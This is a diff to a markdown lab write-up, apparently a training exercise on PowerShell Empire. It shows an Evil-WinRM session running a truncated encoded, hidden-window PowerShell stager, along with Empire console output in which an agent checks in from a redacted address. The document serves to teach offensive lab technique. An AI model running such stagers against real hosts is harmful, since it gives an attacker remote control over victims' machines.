@@ -309,17 +309,24 @@ powershell -noP -sta -w 1 -enc  SQBGACgAJABQAFMAVgBlAFIAcwBpAG8AbgBUAEEAQgBMAEUA
 <code>No answer needed</code></p>
 
 ```bash
-*Evil-WinRM* PS C:\Users\Sam\Documents> powershell -noP -sta -w 1 -enc  SQBGACgAJABQAFMAVgBlAFIA...=
+Evil-WinRM* PS C:\Users\Sam\Documents> powershell -noP -sta -w 1 -enc  SQBG...
 ```
 
-<img width="1249" height="773" alt="image" src="https://github.com/user-attachments/assets/5c3bfe9f-53e1-4fbf-93ab-b067868a7404" />
+```bash
+(Empire: stager/multi/launcher) > 
+[*] Sending POWERSHELL stager (stage 1) to xx.xxx.xx.xx
+[*] New agent 32H68BSD checked in
+[+] Initial agent 32H68BSD from xx.xxx.xx.xx now active (Slack)
+[*] Sending agent (stage 2) to 32H68BSD at xx.xxx.xx.xx
+```
 
+<img width="1754" height="830" alt="image" src="https://github.com/user-attachments/assets/b0734520-ee48-4fc7-bc7e-a685d0db380a" />
 
-<img width="1338" height="581" alt="image" src="https://github.com/user-attachments/assets/119865e6-91bb-47e4-afd1-03f5f34ff852" />
+<br>
+<br>
 
-<img width="1335" height="779" alt="image" src="https://github.com/user-attachments/assets/a216a2ec-c1ea-4060-82c7-1c5af531633a" />
+<img width="1763" height="832" alt="image" src="https://github.com/user-attachments/assets/8fcc8a6f-d38d-47f6-a318-9fab223c6e3a" />
 
-<img width="1132" height="330" alt="image" src="https://github.com/user-attachments/assets/67f3ac89-3de8-4f4b-99b3-cbb930050d62" />
 
 <br>
 <h2>Task 6 . Spawn as a New Process</h2>
